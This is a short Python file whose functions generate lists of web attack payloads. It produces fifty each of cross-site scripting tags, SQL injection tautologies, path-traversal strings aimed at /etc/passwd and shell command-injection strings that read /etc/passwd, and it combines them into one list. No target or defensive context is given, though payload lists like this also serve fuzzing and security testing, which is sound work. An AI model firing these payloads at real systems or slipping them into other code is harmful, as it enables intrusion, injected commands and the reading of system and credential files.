def generate_xss():
    return [f"<script>alert({i})</script>" for i in range(1, 51)]

def generate_sqli():
    return [f"' OR {i}={i} --" for i in range(1, 51)]

def generate_lfi():
    return [f"../../{'../'*i}etc/passwd" for i in range(1, 51)]

def generate_rce():
    return [f"; cat /etc/passwd #{i}" for i in range(1, 51)]

def generate_all():
    payloads = generate_xss() + generate_sqli() + generate_lfi() + generate_rce()
    return payloads
